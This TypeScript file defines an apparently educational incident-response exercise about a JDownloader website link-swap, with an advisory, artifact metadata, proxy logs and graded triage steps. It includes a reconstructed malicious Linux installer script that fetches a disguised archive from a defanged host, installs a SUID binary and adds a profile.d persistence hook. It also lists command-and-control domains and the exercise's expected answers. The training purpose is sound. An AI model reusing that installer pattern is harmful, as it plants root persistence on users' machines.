import type { Scenario } from "../types";

export const jdownloaderInstallerSwap: Scenario = {
  slug: "jdownloader-installer-swap",
  exhibit: "EXH-037",
  title: "The Installer Swap",
  tagline:
    "May 9, 2026. JDownloader confirms its official website sent some Windows and Linux users to hostile installer links. Your job is to sort trusted packages from swapped download targets.",
  category: "incident-response",
  difficulty: "intermediate",
  era: "2020s",
  year: "2026",
  estMinutes: 10,
  fictional: true,
  cwd: "/home/analyst",
  user: "analyst",
  host: "download-forensics",
  role: "Desktop fleet responder triaging installer downloads after the JDownloader website incident report goes live.",
  objective:
    "Identify which downloaded artifacts came from the swapped links, find the Linux persistence behavior, and name the network indicators that require blocking.",
  briefing:
    "On May 9, 2026, reporting followed JDownloader's May 8 incident report: attackers altered published website links so some alternative Windows installer links and the Linux shell installer pointed to unrelated malicious files during May 6-7 UTC. The project said CMS-managed website content was changed, not the underlying server stack, and genuine installer packages were not modified. Your evidence bag has hashes, signatures, an extracted shell installer, and proxy logs from one employee laptop.",
  env: {
    USER: "analyst",
    SHELL: "/bin/sh",
    PWD: "/home/analyst",
  },
  ps: [
    "  PID TTY          TIME CMD",
    "  501 ?        00:00:00 sh",
    "  502 ?        00:00:00 ps",
  ],
  history: ["pwd", "ls"],
  files: {
    "/home/analyst/ADVISORY.md": {
      content: [
        "JDownloader website installer incident (May 2026)",
        "",
        "Risk window: 2026-05-06 to 2026-05-07 UTC",
        "At risk: users who downloaded and executed one of these website links:",
        '  - Windows "Download Alternative Installer" links',
        "  - Linux shell installer link",
        "",
        "Observed facts from public incident reporting:",
        "  - attackers changed CMS-managed website pages and access control data",
        "  - the underlying host filesystem and OS-level server control were not seen",
        "  - genuine JDownloader installer packages were not modified",
        "  - in-app updates, macOS downloads, Flatpak, Winget, Snap, and the main JAR were not affected",
        "  - genuine Windows installers should be signed by AppWork GmbH",
        "",
        "Malware notes:",
        "  - Windows payload: loader that deployed an obfuscated Python RAT",
        "  - Linux payload: shell script downloaded a fake SVG from checkinnhotels[.]com",
        "  - Linux persistence: pkg copied to /root/.local/share/.pkg, systemd-exec installed SUID,",
        "    and /etc/profile.d/systemd.sh used to relaunch the payload",
        "",
        "Local objective: find the swapped artifacts, confirm whether anything executed, and block the IOCs.",
      ].join("\n"),
    },
    "/home/analyst/downloads/appwork-main-jar.txt": {
      content: [
        "artifact: JDownloader.jar",
        "source: main download",
        "status: genuine",
        "publisher: AppWork GmbH",
        "signature: valid",
        "sha256: 7f42c3a4c5ef2b9d9fbd6174e91d711fa65cb7d811d5dfd2bf0f1f4e515f8c21",
        "notes: main JAR package was not part of the link swap",
      ].join("\n"),
    },
    "/home/analyst/downloads/windows-alt-setup.exe.txt": {
      content: [
        "artifact: JDownloaderSetup_alt_2026-05-06.exe",
        'source: Windows "Download Alternative Installer"',
        "status: suspicious",
        "publisher: Zipline LLC",
        "signature: invalid chain",
        "sha256: 0b3fe2a0d11c7c8fc9d2f0ef7f6f9b71a1d662754c1c04d4cd5ca87c58ab41e2",
        "size: 5231280",
        "verdict: swapped link payload, do not run",
      ].join("\n"),
    },
    "/home/analyst/downloads/README.txt": {
      content: [
        "Quick triage rule:",
        "",
        "1. If the file came from an affected website link during May 6-7 UTC, treat it as suspect.",
        "2. On Windows, verify the Digital Signatures tab before execution.",
        "3. Expected publisher is AppWork GmbH.",
        "4. Missing signatures, invalid chains, or unexpected publishers mean delete the file and rebuild if executed.",
      ].join("\n"),
    },
    "/home/analyst/downloads/linux-installer.sh": {
      content: [
        "#!/bin/sh",
        "# captured from employee workstation, do not execute",
        'work="/tmp/.jd-u"',
        'mkdir -p "$work"',
        'curl -fsSL "https://checkinnhotels[.]com/static/logo.svg" -o "$work/logo.svg"',
        'tar -xzf "$work/logo.svg" -C "$work"',
        'cp "$work/pkg" /root/.local/share/.pkg',
        'install -m 4755 "$work/systemd-exec" /usr/bin/systemd-exec',
        'printf "%s\\n" "/usr/libexec/upowerd --session" > /etc/profile.d/systemd.sh',
        "/usr/bin/systemd-exec --name /usr/libexec/upowerd",
      ].join("\n"),
    },
    "/home/analyst/logs/proxy.log": {
      content: [
        "2026-05-06T12:14:06Z laptop-17 GET https://jdownloader.org/download/index status=200",
        "2026-05-06T12:14:19Z laptop-17 GET https://download-mirror.invalid/JDownloaderSetup_alt.exe status=200 bytes=5231280",
        "2026-05-06T12:16:03Z laptop-17 GET https://checkinnhotels[.]com/static/logo.svg status=200 bytes=112904",
        "2026-05-06T12:16:04Z laptop-17 POST https://parkspringshotel[.]com/m/Lu6aeloo.php status=200 bytes=4824",
        "2026-05-06T12:17:50Z laptop-17 POST https://auraguest[.]lk/m/douV2quu.php status=200 bytes=912",
      ].join("\n"),
    },
    "/home/analyst/REMEDIATION.md": {
      content: [
        "Decision: laptop-17 executed a swapped Linux shell installer.",
        "",
        "Actions:",
        "  1. Isolate and rebuild the host. Do not trust cleanup only.",
        "  2. Reset passwords and tokens used after install.",
        "  3. Delete downloaded artifacts whose publisher is not AppWork GmbH or whose signature is missing.",
        "  4. Block and hunt for checkinnhotels[.]com, parkspringshotel[.]com, and auraguest[.]lk.",
        "  5. Notify users who downloaded affected links during May 6-7 UTC.",
        "",
        "Lesson: link integrity and publisher validation matter even when vendor binaries are unchanged.",
      ].join("\n"),
    },
  },
  steps: [
    {
      id: "advisory",
      goal: "Read the incident advisory.",
      hint: "`cat ADVISORY.md`.",
      matches: [{ kind: "exact", command: "cat ADVISORY.md" }],
      narration:
        "The scope is tight: alternative Windows installer links and the Linux shell installer link during May 6-7 UTC. Genuine packages were not modified, so signature and source checks are decisive.",
    },
    {
      id: "inventory",
      goal: "List the downloaded evidence files.",
      hint: "`ls downloads`.",
      matches: [{ kind: "exact", command: "ls downloads" }],
      narration:
        "The evidence bag has two metadata summaries, a README with the triage rule, and an extracted Linux installer script.",
    },
    {
      id: "publishers",
      goal: "Compare the recorded publishers for the Windows artifacts.",
      hint: "`grep -nF publisher downloads/*.txt`.",
      matches: [{ kind: "exact", command: "grep -nF publisher downloads/*.txt" }],
      narration:
        "AppWork GmbH is the expected publisher. Zipline LLC on the alternative setup is the red flag that matches user reports from the incident.",
    },
    {
      id: "windows-alt",
      goal: "Open the suspicious Windows alternative installer metadata.",
      hint: "`cat downloads/windows-alt-setup.exe.txt`.",
      matches: [
        { kind: "exact", command: "cat downloads/windows-alt-setup.exe.txt" },
      ],
      narration:
        "The alternative installer has an invalid chain and an unexpected publisher. Treat it as a swapped link payload, not a broken AppWork package.",
    },
    {
      id: "linux-payload",
      goal: "Find the download point inside the Linux shell installer.",
      hint: "`grep -nF checkinnhotels downloads/linux-installer.sh`.",
      matches: [
        {
          kind: "exact",
          command: "grep -nF checkinnhotels downloads/linux-installer.sh",
        },
      ],
      narration:
        "The fake SVG fetch is the staging point. The following lines unpack binaries, install systemd-exec with SUID permissions, and drop a profile script for persistence.",
    },
    {
      id: "network-iocs",
      goal: "Hunt the proxy log for every known network indicator.",
      hint:
        "`grep -nE \"checkinnhotels|parkspringshotel|auraguest\" logs/proxy.log`.",
      matches: [
        {
          kind: "exact",
          command:
            'grep -nE "checkinnhotels|parkspringshotel|auraguest" logs/proxy.log',
        },
      ],
      narration:
        "All three indicators appear from laptop-17: the Linux staging host plus the two RAT command and control endpoints reported by researchers.",
    },
    {
      id: "remediation",
      goal: "Open the containment and recovery note.",
      hint: "`cat REMEDIATION.md`.",
      matches: [{ kind: "exact", command: "cat REMEDIATION.md" }],
      narration:
        "Because arbitrary code may have executed, rebuild the host, reset credentials, block the indicators, and notify users in the affected download window.",
    },
  ],
  debrief: {
    summary:
      "The JDownloader website installer incident was reported in May 2026 after attackers altered CMS-managed website links so selected Windows alternative installer links and the Linux shell installer link pointed to malicious third-party files during May 6-7 UTC. Public reporting said the official JDownloader packages were not modified, and the project described the intrusion as website content and access control manipulation rather than server filesystem compromise. BleepingComputer reported that the Windows malware deployed an obfuscated Python RAT, while the Linux installer pulled a fake SVG from checkinnhotels[.]com, unpacked ELF payloads, installed a SUID systemd-exec binary, and used /etc/profile.d/systemd.sh for persistence.",
    lesson:
      "Supply-chain response starts with precise scoping. In this case, the compromised trust path was the website link, not every JDownloader distribution path. That means responders should identify users who downloaded and executed the affected links during the window, validate publisher signatures before execution, block known network indicators, and rebuild systems where the malicious installer ran. Clean vendor binaries do not help once a download page points users somewhere else.",
    simulated: [
      "The employee laptop, proxy log, metadata files, hashes, and local incident notes are invented.",
      "The incident window, affected installer link classes, AppWork GmbH signature check, CMS-level website compromise, and unaffected package paths are based on JDownloader's public incident report.",
      "The Python RAT description, checkinnhotels[.]com Linux staging host, parkspringshotel[.]com and auraguest[.]lk command and control indicators, and Linux persistence behavior are based on BleepingComputer's May 9, 2026 reporting.",
    ],
  },
};
